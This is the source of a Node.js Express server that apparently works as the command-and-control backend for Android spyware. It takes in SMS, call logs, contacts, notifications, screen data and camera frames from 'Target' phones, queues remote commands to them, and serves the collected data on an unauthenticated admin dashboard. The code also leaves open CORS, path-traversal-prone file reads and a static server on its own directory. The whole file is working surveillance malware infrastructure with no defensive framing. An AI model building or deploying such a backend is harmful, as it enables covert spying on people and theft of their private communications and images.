const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. Storage Setup ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

// --- 2. Middleware ---
app.use(cors());
// Image upload ke liye limit badhana zaroori hai
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// --- 3. Live RAM Memory (Device Status) ---
let devicesStatus = {}; 

// ==================================================
// 📲 PHONE SIDE API (Android yahan data bhejega)
// ==================================================

// 1. HEARTBEAT / STATUS UPDATE
app.post('/api/status', (req, res) => {
    let { device_id, model, battery, version, charging } = req.body;
    
    // Safety Check
    if (!device_id) return res.status(400).json({ error: "No ID provided" });

    const id = device_id.toString().trim().toUpperCase();

    // Check agar koi COMMAND pending hai is phone ke liye
    const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

    // Update RAM
    devicesStatus[id] = {
        id: id,
        model: model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lastSeen: Date.now(),
        command: "none" // Command delivered, now reset
    };

    console.log(`📡 [PING] ${id} | Bat: ${battery}% | Cmd: ${pendingCommand}`);
    res.json({ status: "success", command: pendingCommand });
});

// 2. DATA UPLOAD (SMS, Notifications, Contacts, Logs)
app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        // Data parsing (String ho to object banao)
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        
        // List wale data types (jo judte jayenge)
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
        
        if (historyTypes.includes(type)) {
            let existingData = [];
            
            // Purani file padho agar hai to
            if (fs.existsSync(filePath)) {
                try { 
                    existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); 
                } catch (e) { 
                    existingData = []; 
                }
            }
            if (!Array.isArray(existingData)) existingData = [];

            // 🔥 MERGE LOGIC: [New Data, ...Old Data]
            // Isse naya message sabse upar rahega file mein
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            const finalData = [...newDataArray, ...existingData];
            
            // File size control (Last 1000 items only)
            fs.writeFileSync(filePath, JSON.stringify(finalData.slice(0, 1000), null, 2));
        } else {
            // Screen recording ya single files replace hongi
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        console.log(`📥 [UPLOAD] ${type} saved for ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error [${id}]:`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// 3. CAMERA FRAME UPLOAD (Ye Missing Tha!)
app.post('/api/upload_frame', (req, res) => {
    let { device_id, image_data } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_cam.json`);

    try {
        // Image ko JSON wrapper me save karte hain taaki frontend asaani se fetch kar sake
        const payload = {
            time: Date.now(),
            image: image_data // Base64 String
        };
        
        fs.writeFileSync(filePath, JSON.stringify(payload, null, 2));
        console.log(`📸 [CAMERA] Frame received from ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Cam Error: ${error.message}`);
        res.status(500).json({ error: "Failed" });
    }
});

// ==================================================
// 💻 DASHBOARD / ADMIN API
// ==================================================

// Get List of All Active Devices
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

// Get Specific Device Status
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];

    if (!device) {
        return res.json({ id: id, isOnline: false, model: "Waiting..." });
    }

    // Agar last seen 60 seconds ke andar hai to Online maano
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

// Send Command (Vibrate, TTS, Toast, etc.)
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Cmd" });

    const id = device_id.toUpperCase().trim();
    
    // Agar device list me nahi hai, to temp add karo
    if (!devicesStatus[id]) {
        devicesStatus[id] = { id: id, model: "Target", lastSeen: 0 };
    }
    
    devicesStatus[id].command = command;
    console.log(`🚀 [CMD QUEUED] ${command} -> ${id}`);
    res.json({ status: "success", target: id });
});

// Get JSON Data Files (View Notifications/SMS on Website)
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const id = req.params.device_id.toUpperCase().trim();
    const type = req.params.type; // notifications, sms, cam, etc.
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        // Agar file nahi hai to empty list bhejo
        res.json([]);
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
    console.log(`📂 SAVING DATA TO: ${UPLOADS_DIR}`);
});
